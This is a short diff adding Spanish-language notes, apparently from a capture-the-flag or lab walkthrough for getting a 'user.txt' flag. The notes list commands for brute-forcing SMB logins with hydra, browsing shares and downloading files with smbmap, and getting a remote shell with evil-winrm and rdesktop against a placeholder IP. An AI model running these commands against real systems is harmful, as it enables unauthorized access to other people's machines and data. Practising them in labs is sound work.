@@ -1,0 +1,17 @@
+User.txt
+
+Hydra al smb:
+hydra -L user.txt -P pass.txt IP smb
+
+Ver carpetas compartidas:
+smbmap -H IP -u user -p pass
+smbmap -H IP -u user -p pass -r folder
+
+Descargar archivo:
+smbmap -H IP -u user -p pass --download path/file
+
+Conectar por winrm:
+evil-winrm -i IP -u user -p pass
+
+pero para hacerlo mas facil, se ha habilitado el rdesktop:
+rdesktop -u 'username' -p 'pass' IP
